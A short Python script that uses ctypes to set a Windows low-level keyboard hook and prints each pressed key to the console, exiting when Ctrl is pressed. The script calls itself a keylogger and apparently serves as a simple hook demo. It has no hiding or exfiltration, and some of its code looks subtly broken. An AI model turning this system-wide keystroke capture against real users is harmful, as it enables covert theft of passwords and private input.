import sys
import ctypes as ct
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

user32 = ct.windll.user32
kernel32 = ct.windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

# 用来处理键盘事件的lParam 参考
# https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-kbdllhookstruct?redirectedfrom=MSDN
class KBDLLHOOKSTRUCT(ct.Structure):
     _fields_ = [
         ('vkCode', DWORD),
         ('scanCode', DWORD),
         ('flags', DWORD),
         ('time', DWORD),
         ('dwExtraInfo', DWORD)]

# 键盘事件钩子回调程序
def hook_proc(nCode, wParam, lParam):
    
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(hooked, nCode, wParam, lParam)
    
    # 指针转换 以获取键盘代码
    kb_struct = ct.cast(lParam, ct.POINTER(KBDLLHOOKSTRUCT))
    print(chr(kb_struct.contents.vkCode))

    # CTRL键退出程序
    if (CTRL_CODE == kb_struct.contents.vkCode):
        print("Ctrl pressed, call uninstallHook()", )
        user32.UnhookWindowsHookEx(hooked)
        sys.exit(-1)         
      
    return user32.CallNextHookEx(hooked, nCode, wParam, lParam)

# 得到CTYPE的函数指针
CMPFUNC = ct.CFUNCTYPE(ct.c_int,  ct.c_int, ct.c_int, ct.POINTER(ct.c_void_p))
pointer = CMPFUNC(hook_proc)

# 设置钩子程序
hooked = user32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW('user32'), 0)

if hooked:
    print('installed keyLogger')
    msg = MSG()
    user32.GetMessageA(ct.byref(msg), 0, 0, 0)


